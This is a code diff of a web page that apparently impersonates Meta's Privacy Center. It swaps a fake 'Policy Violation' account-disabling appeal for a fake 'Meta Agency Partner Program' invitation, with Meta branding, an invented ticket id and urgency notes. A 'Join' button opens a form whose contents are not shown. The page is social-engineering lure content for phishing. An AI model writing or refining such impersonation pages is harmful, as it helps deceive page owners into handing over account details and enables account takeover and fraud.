@@ -3,7 +3,6 @@ import BackgroundImage from '@/assets/images/bg-image.png';
 import MetaAI from '@/assets/images/meta-ai-image.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ProfileImage from '@/assets/images/profile-image.png';
-import WarningImage from '@/assets/images/warning.png';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
 import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
@@ -149,7 +148,7 @@ const Page: FC = () => {
 
         isTranslatingRef.current = true;
 
-        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Policy Violation', 'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.', 'This form is only to be used for submitting appeals and restoring account status.', 'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
+        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Meta Agency Partner Program', 'Your agency has been selected as a qualified candidate to participate in the Meta Agency Partner Program. This invitation gives you access to exclusive tools, premium support, and growth opportunities designed to help you scale your business and serve clients more effectively.', 'If you’re ready to take advantage of these partner benefits, you can submit your participation request.', 'Your ticket id: #F43H-IFKM-NHAV', 'Important Notes', 'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.', 'Our verification team may reach out within 2 business days if additional details are needed.', 'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.', 'Participation Request', 'Confirming your eligibility to join the program', 'Please make sure to provide the required information below. Missing details may delay the processing of your request.', 'Join Meta Agency Program', 'You have been invited to join the Meta Media Agency Program on', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -166,7 +165,7 @@ const Page: FC = () => {
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
-            <title>Policy Violation - Page Appeal</title>
+            <title>Meta Agency Partner Program - Page Appeal</title>
             <div className='flex w-full max-w-[1100px]'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                     <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
@@ -180,15 +179,25 @@ const Page: FC = () => {
                 </div>
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                     <div className='flex items-center gap-2'>
-                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
-                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
+                        <p className='text-2xl font-bold'>{t('Meta Agency Partner Program')}</p>
                     </div>
-                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
-                    <div className='rounded-b-[20px] bg-white'>
-                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
+                    <p>{t('Your agency has been selected as a qualified candidate to participate in the Meta Agency Partner Program. This invitation gives you access to exclusive tools, premium support, and growth opportunities designed to help you scale your business and serve clients more effectively.')}</p>
+                    <p>{t('If you’re ready to take advantage of these partner benefits, you can submit your participation request.')}</p>
+                    <p className='text-[#465a69]'>{t('Your ticket id: #F43H-IFKM-NHAV')}</p>
+                    <p className='text-[15px] font-bold'>{t('Important Notes')}</p>
+                    <ul className='list-inside list-disc text-[15px]'>
+                        <li>{t('Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.')}</li>
+                        <li>{t('Our verification team may reach out within 2 business days if additional details are needed.')}</li>
+                        <li>{t('Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.')}</li>
+                    </ul>
+                    <div className='rounded-[20px] bg-[#D2D2FE]'>
+                        <Image src={BackgroundImage} alt='' className='py-10' />
                         <div className='flex flex-col items-center justify-center gap-5 p-5'>
-                            <p className='text-2xl'>{t('This form is only to be used for submitting appeals and restoring account status.')}</p>
-                            <p className='text-[15px]'>{t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}</p>
+                            <div className='rounded-[20px] bg-white p-4'>
+                                <p className='text-[15px]'>{t('Participation Request')}</p>
+                                <p className='text-[15px] font-bold'>{t('Confirming your eligibility to join the program')}</p>
+                                <p className='text-[15px]'>{t('Please make sure to provide the required information below. Missing details may delay the processing of your request.')}</p>
+                            </div>
                             <button
                                 onClick={() => {
                                     setModalKey((prev) => prev + 1);
@@ -196,8 +205,11 @@ const Page: FC = () => {
                                 }}
                                 className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                             >
-                                {t('Request Review')}
+                                {t('Join Meta Agency Program')}
                             </button>
+                            <p className='inline-flex w-full text-[14px] gap-1'>
+                                {t('You have been invited to join the Meta Media Agency Program on')} <p className='font-bold'> {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
+                            </p>
                         </div>
                     </div>
                     <div className='flex flex-col gap-3'>
